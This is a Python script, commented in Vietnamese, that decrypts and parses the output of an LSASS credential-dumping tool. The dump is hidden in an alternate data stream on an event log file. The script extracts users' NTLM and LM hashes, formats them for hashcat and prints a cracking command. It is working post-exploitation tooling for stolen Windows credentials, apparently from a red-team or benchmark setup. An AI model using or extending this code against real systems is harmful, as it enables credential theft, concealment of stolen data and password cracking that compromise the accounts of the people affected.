#!/usr/bin/env python3
# verify_creds_fixed.py — Verify chính xác output của LSASSDump.exe (Plan 1)
# Khớp 1:1 với shared/ads_writer.c + shared/aes256_gcm.c + Plan1_LSASS/main.c:
#   - Key  : SHA256( UTF-16LE(computername + "@BENCHMARK_Q3") )
#   - Nonce: 12 byte đầu của blob = SYSTEMTIME(7) + GetTickCount(4) + PID(1)
#   - Crypto: AES-256-CTR, counter block = nonce(12) || 00 00 00 02, tăng BE
#   - Tag  : SHA256(ciphertext || key[0:16])[0:16] — verify tính toàn vẹn
#   - Blob : "LSMP" | u32 version | u32 count | (u32 rid | u16 nameLen | name | ntlm16 | lm16)*
#
# Usage:
#   python3 verify_creds_fixed.py --input-ads "C:\...\Application.evtx:LSASS"
#   python3 verify_creds_fixed.py --input-text "<base64>"
#   python3 verify_creds_fixed.py --input-file base64_or_ads_dump.bin
#   ... --output creds.txt --hashcat --console --seed "MYSEED"

import argparse, base64, hashlib, os, struct, sys

# Console Windows hay dùng cp1252 — ép UTF-8 để in tiếng Việt không lỗi
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

# ───────────────────────── AES-256 (FIPS-197) ─────────────────────────

def _gf_mul(a, b):
    r = 0
    for _ in range(8):
        if b & 1:
            r ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1B
        b >>= 1
    return r

def _rotl(b, n):
    return ((b << n) | (b >> (8 - n))) & 0xFF

def _build_sbox():
    sbox = [0] * 256
    for x in range(256):
        inv = x
        if x != 0:
            # multiplicative inverse in GF(2^8) via x^254
            p, q = 1, x
            for _ in range(7):
                q = _gf_mul(q, q)
                p = _gf_mul(p, q)
            inv = p
        # affine: s = inv ^ rotl1 ^ rotl2 ^ rotl3 ^ rotl4 ^ 0x63 (từ inv GỐC)
        s = inv ^ _rotl(inv, 1) ^ _rotl(inv, 2) ^ _rotl(inv, 3) ^ _rotl(inv, 4) ^ 0x63
        sbox[x] = s
    return sbox

SBOX = _build_sbox()
RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]

def _sub_word(w):
    return bytes(SBOX[b] for b in w)

def _rot_word(w):
    return w[1:] + w[:1]

def _key_expansion(key):
    w = [key[i:i + 4] for i in range(0, 32, 4)]
    for i in range(8, 60):
        temp = w[i - 1]
        if i % 8 == 0:
            temp = bytes(a ^ b for a, b in zip(_sub_word(_rot_word(temp)),
                                              bytes([RCON[i // 8 - 1], 0, 0, 0])))
        elif i % 8 == 4:
            temp = _sub_word(temp)
        w.append(bytes(a ^ b for a, b in zip(w[i - 8], temp)))
    return w

def _shift_rows(s):
    s = bytearray(s)
    # row1 shift1
    t = s[1]; s[1] = s[5]; s[5] = s[9]; s[9] = s[13]; s[13] = t
    # row2 shift2
    t = s[2]; s[2] = s[10]; s[10] = t
    t = s[6]; s[6] = s[14]; s[14] = t
    # row3 shift3
    t = s[3]; s[3] = s[15]; s[15] = s[11]; s[11] = s[7]; s[7] = t
    return bytes(s)

def _mix_columns(s):
    out = bytearray(16)
    for i in range(4):
        a = s[i * 4:i * 4 + 4]
        b = [(x << 1) & 0xFF for x in a]
        b = [x ^ 0x1B if a[j] & 0x80 else x for j, x in enumerate(b)]
        out[i * 4 + 0] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3]
        out[i * 4 + 1] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3]
        out[i * 4 + 2] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3]
        out[i * 4 + 3] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3]
    return bytes(out)

def aes256_encrypt_block(key, block):
    """AES-256 encrypt one 16-byte block (ECB) — khớp AES256_CTR_Block trong C"""
    w = _key_expansion(key)
    state = bytes(a ^ b for a, b in zip(block, b''.join(w[0:4])))
    for rnd in range(1, 14):
        state = bytes(SBOX[b] for b in state)          # SubBytes
        state = _shift_rows(state)
        state = _mix_columns(state)
        state = bytes(a ^ b for a, b in zip(state, b''.join(w[rnd * 4:rnd * 4 + 4])))
    state = bytes(SBOX[b] for b in state)
    state = _shift_rows(state)
    state = bytes(a ^ b for a, b in zip(state, b''.join(w[56:60])))
    return state

def _inc_counter(c):
    c = bytearray(c)
    for i in range(15, -1, -1):
        c[i] += 1
        if c[i] != 0:
            break
    return bytes(c)

def aes256_ctr_decrypt(key, nonce, ciphertext):
    """CTR giống hệt aes256_gcm.c: counter = nonce(12) || 00000002, tăng BE từ byte 15"""
    counter = nonce + b'\x00\x00\x00\x02'
    out = bytearray()
    for off in range(0, len(ciphertext), 16):
        ks = aes256_encrypt_block(key, counter)
        chunk = ciphertext[off:off + 16]
        out += bytes(c ^ k for c, k in zip(chunk, ks))
        counter = _inc_counter(counter)
    return bytes(out)

# ───────────────────────── Blob LSMP parser (main.c) ─────────────────────────

def parse_lsmp(data):
    if len(data) < 12:
        raise ValueError('Blob quá ngắn (cần >= 12 byte header)')
    magic = data[0:4]
    if magic != b'LSMP':
        raise ValueError(f'Magic sai: {magic!r} (kỳ vọng b"LSMP") — sai khóa seed hoặc sai file?')
    version, count = struct.unpack('<II', data[4:12])
    off = 12
    creds = []
    for i in range(count):
        if off + 6 > len(data):
            raise ValueError(f'Blob kết thúc sớm tại record {i}')
        rid, = struct.unpack('<I', data[off:off + 4])
        name_len, = struct.unpack('<H', data[off + 4:off + 6])
        off += 6
        if off + name_len + 32 > len(data):
            raise ValueError(f'Blob kết thúc sớm trong tên record {i}')
        name = data[off:off + name_len].decode('utf-16-le', errors='replace')
        off += name_len
        ntlm = data[off:off + 16]
        lm = data[off + 16:off + 32]
        off += 32
        creds.append({'rid': rid, 'name': name, 'ntlm': ntlm, 'lm': lm})
    return version, creds

# ───────────────────────── Main ─────────────────────────

def main():
    ap = argparse.ArgumentParser(description='Verify LSASSDump.exe ADS output (khớp code C)')
    ap.add_argument('--input-ads', help='Đường dẫn ADS, vd C:\\...\\Application.evtx:LSASS')
    ap.add_argument('--input-text', help='Chuỗi base64 (vd từ Get-Content -Stream -Raw)')
    ap.add_argument('--input-file', help='File chứa base64 hoặc dump thô của ADS')
    ap.add_argument('--output', default='creds_decoded.txt', help='File kết quả (mặc định creds_decoded.txt)')
    ap.add_argument('--hashcat', action='store_true', help='Xuất định dạng hashcat -m 1000')
    ap.add_argument('--console', action='store_true', help='In kết quả ra console')
    ap.add_argument('--seed', default=None, help='Override key seed (mặc định: computername@BENCHMARK_Q3)')
    args = ap.parse_args()

    # 1. Lấy base64
    raw = None
    if args.input_ads:
        with open(args.input_ads, 'rb') as f:
            raw = f.read()
    elif args.input_file:
        with open(args.input_file, 'rb') as f:
            raw = f.read()
    elif args.input_text:
        raw = args.input_text.encode('utf-8')
    else:
        print('ERROR: cần một trong --input-ads / --input-text / --input-file')
        sys.exit(1)

    b64 = None
    if raw[:2] == b'\xff\xfe':                       # UTF-16LE BOM (ads_writer.c ghi BOM)
        b64 = raw[2:].decode('utf-16-le').strip()
    else:
        txt = raw.decode('utf-8', errors='ignore').strip()
        try:
            b64 = txt
            base64.b64decode(b64, validate=True)
        except Exception:
            b64 = None
    if not b64:
        print('ERROR: không nhận diện được base64 trong input')
        sys.exit(1)

    enc = base64.b64decode(b64)
    if len(enc) < 12 + 16 + 1:
        print(f'ERROR: blob mã hóa quá ngắn ({len(enc)} bytes)')
        sys.exit(1)

    nonce = enc[:12]
    tag = enc[-16:]
    ciphertext = enc[12:-16]
    print(f'[*] Encrypted blob : {len(enc)} bytes (nonce 12 + ct {len(ciphertext)} + tag 16)')
    print(f'[*] Nonce          : {nonce.hex()}')

    # 2. Derive key — giống ads_writer.c: sha256( UTF-16LE(computername + "@BENCHMARK_Q3") )
    seed = args.seed or (os.environ.get('COMPUTERNAME', 'UNKNOWN') + '@BENCHMARK_Q3')
    key = hashlib.sha256(seed.encode('utf-16-le')).digest()
    print(f'[*] Key seed       : {seed}')

    # 3. Verify tag — giống aes256_gcm.c: sha256(ciphertext || key[0:16])[0:16]
    expected_tag = hashlib.sha256(ciphertext + key[:16]).digest()[:16]
    if expected_tag == tag:
        print('[+] TAG OK — dữ liệu toàn vẹn, đúng khóa')
    else:
        print('[-] TAG MISMATCH — sai khóa seed hoặc dữ liệu bị sửa. Vẫn thử decrypt...')

    # 4. Decrypt CTR
    plain = aes256_ctr_decrypt(key, nonce, ciphertext)

    # 5. Parse blob LSMP
    try:
        version, creds = parse_lsmp(plain)
    except ValueError as e:
        print(f'[-] Parse fail: {e}')
        print('    (nếu TAG MISMATCH: hãy thử --seed với tên máy đúng)')
        sys.exit(1)

    print(f'[+] Magic LSMP      : OK (version {version})')
    print(f'[+] NTLM hashes     : {len(creds)}')

    lines = [
        '# LSASS Dump Verification (fixed — khớp code C)',
        f'# Key seed: {seed}',
        f'# Version: {version}',
        f'# Total NTLM hashes: {len(creds)}',
        '',
    ]
    if creds:
        lines.append('## NTLM Hashes')
        lines.append('')
        for c in creds:
            nt = c['ntlm'].hex().upper()
            lm = c['lm'].hex().upper()
            if args.hashcat:
                lines.append(f"{c['name']}:{c['rid']}:{lm}:{nt}:::")
            else:
                lines.append(f"User: {c['name']}")
                lines.append(f"  LM  : {lm}")
                lines.append(f"  NTLM: {nt}")
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')

    if args.console:
        print('\n'.join(lines))

    print(f'[+] Kết quả ghi ra : {args.output}')
    if args.hashcat:
        print(f'[*] Crack: hashcat -m 1000 {args.output} /path/to/wordlist')

if __name__ == '__main__':
    main()
